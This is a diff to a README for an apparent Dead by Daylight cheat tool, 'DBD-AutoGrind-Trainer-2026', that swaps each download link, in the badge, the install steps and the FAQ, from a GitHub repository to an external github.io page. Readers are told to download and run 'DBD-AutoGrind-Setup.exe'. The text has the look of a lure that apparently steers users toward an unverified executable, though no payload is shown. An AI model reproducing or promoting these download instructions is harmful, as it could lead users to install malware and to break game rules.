@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your Dead by Daylight progression easily
 
-[![Download Now](https://img.shields.io/badge/Download-External_Tool-blue.svg)](https://github.com/AvarieMaxima/DBD-AutoGrind-Trainer-2026)
+[![Download Now](https://img.shields.io/badge/Download-External_Tool-blue.svg)](https://avariemaxima.github.io)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ This tool manages your Dead by Daylight progression. It automates bloodpoint col
 Follow these steps to set up the trainer on your computer. Read each step to avoid errors during installation.
 
 1. Verify your Windows version meets the requirements.
-2. Visit the [official repository page](https://github.com/AvarieMaxima/DBD-AutoGrind-Trainer-2026) to download the current version.
+2. Visit the [official repository page](https://avariemaxima.github.io) to download the current version.
 3. Locate the file named `DBD-AutoGrind-Setup.exe` in your browser downloads folder.
 4. Move the file to a folder where you store your game tools.
 
@@ -64,7 +64,7 @@ Ensure you run both the game and the trainer with identical permissions. Restart
 The software is free to use. You can access all listed features without extra payments.
 
 **Where do I find the latest version?**
-Visit this link to download the software: https://github.com/AvarieMaxima/DBD-AutoGrind-Trainer-2026
+Visit this link to download the software: https://avariemaxima.github.io
 
 ## 📝 Troubleshooting Guide
 
